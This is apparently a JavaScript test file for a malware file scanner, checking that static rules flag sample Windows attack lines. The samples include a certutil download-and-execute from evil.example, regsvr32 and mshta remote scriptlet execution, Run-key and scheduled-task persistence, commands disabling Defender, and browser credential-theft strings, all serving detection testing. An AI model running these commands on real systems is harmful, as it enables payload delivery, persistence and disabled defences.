import fs from "fs/promises";
import os from "os";
import path from "path";
import { afterEach, describe, expect, it } from "vitest";
import { scanUploadedFile } from "../src/scanner/fileScanner.js";

const tempRoots = [];

async function createTempFile(fileName, content) {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), "virovanta-static-rules-test-"));
  const filePath = path.join(root, fileName);
  tempRoots.push(root);
  await fs.writeFile(filePath, content);
  return filePath;
}

afterEach(async () => {
  const roots = tempRoots.splice(0);
  await Promise.all(roots.map((root) => fs.rm(root, { recursive: true, force: true })));
});

describe("file scanner composite static rules", () => {
  it("flags download-and-execute behavior chains", async () => {
    const filePath = await createTempFile(
      "stage.cmd",
      Buffer.from('certutil -urlcache -split -f https://evil.example/payload.exe payload.exe\r\ncmd.exe /c payload.exe\r\n')
    );

    const report = await scanUploadedFile({
      filePath,
      originalName: "stage.cmd",
      declaredMimeType: "text/plain"
    });

    expect(report.findings.some((finding) => finding.id === "download_execute_chain")).toBe(true);
    expect(report.engines.staticRules.matchedRules).toContain("download_execute_chain");
  });

  it("flags registry and scheduled-task persistence patterns", async () => {
    const filePath = await createTempFile(
      "persist.bat",
      Buffer.from(
        'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\Users\\Public\\updater.exe\r\nschtasks /create /sc onlogon /tr "C:\\Users\\Public\\updater.exe"\r\n'
      )
    );

    const report = await scanUploadedFile({
      filePath,
      originalName: "persist.bat",
      declaredMimeType: "text/plain"
    });

    expect(report.findings.some((finding) => finding.id === "registry_runkey_persistence")).toBe(true);
    expect(report.findings.some((finding) => finding.id === "scheduled_task_persistence")).toBe(true);
  });

  it("flags regsvr32 scriptlet proxy execution", async () => {
    const filePath = await createTempFile(
      "regsvr32.txt",
      Buffer.from("regsvr32 /s /n /u /i:https://evil.example/payload.sct scrobj.dll")
    );

    const report = await scanUploadedFile({
      filePath,
      originalName: "regsvr32.txt",
      declaredMimeType: "text/plain"
    });

    expect(report.findings.some((finding) => finding.id === "regsvr32_scriptlet_proxy")).toBe(true);
  });

  it("flags mshta and rundll32 proxy-execution patterns", async () => {
    const [mshtaPath, rundllPath] = await Promise.all([
      createTempFile("mshta.hta", Buffer.from("mshta https://evil.example/dropper.hta")),
      createTempFile(
        "rundll32.txt",
        Buffer.from('rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";document.write();')
      )
    ]);

    const [mshtaReport, rundllReport] = await Promise.all([
      scanUploadedFile({
        filePath: mshtaPath,
        originalName: "mshta.hta",
        declaredMimeType: "application/hta"
      }),
      scanUploadedFile({
        filePath: rundllPath,
        originalName: "rundll32.txt",
        declaredMimeType: "text/plain"
      })
    ]);

    expect(mshtaReport.findings.some((finding) => finding.id === "mshta_remote_execution")).toBe(true);
    expect(rundllReport.findings.some((finding) => finding.id === "rundll32_proxy_execution")).toBe(true);
  });

  it("flags defender tampering and browser credential theft indicators", async () => {
    const [defenderPath, stealerPath] = await Promise.all([
      createTempFile(
        "defender.ps1",
        Buffer.from("Set-MpPreference -DisableRealtimeMonitoring $true\r\nAdd-MpPreference -ExclusionPath C:\\Users\\Public\r\n")
      ),
      createTempFile(
        "stealer.txt",
        Buffer.from("Login Data Cookies Web Data Local State encrypted_key CryptUnprotectData")
      )
    ]);

    const [defenderReport, stealerReport] = await Promise.all([
      scanUploadedFile({
        filePath: defenderPath,
        originalName: "defender.ps1",
        declaredMimeType: "text/plain"
      }),
      scanUploadedFile({
        filePath: stealerPath,
        originalName: "stealer.txt",
        declaredMimeType: "text/plain"
      })
    ]);

    expect(defenderReport.findings.some((finding) => finding.id === "defender_tampering")).toBe(true);
    expect(stealerReport.findings.some((finding) => finding.id === "browser_data_theft")).toBe(true);
  });

  it("flags encoded payload staging patterns", async () => {
    const filePath = await createTempFile(
      "loader.ps1",
      Buffer.from('powershell.exe -enc SQBFAFgA\r\n[Convert]::FromBase64String("U0dWc2JHOD0=")\r\nStart-Process calc.exe\r\n')
    );

    const report = await scanUploadedFile({
      filePath,
      originalName: "loader.ps1",
      declaredMimeType: "text/plain"
    });

    expect(report.findings.some((finding) => finding.id === "encoded_payload_stager")).toBe(true);
    expect(report.recommendations.some((item) => /string deobfuscation/i.test(item))).toBe(true);
    expect(report.recommendations.some((item) => /yara rules \+ string deobfuscation/i.test(item))).toBe(false);
  });
});
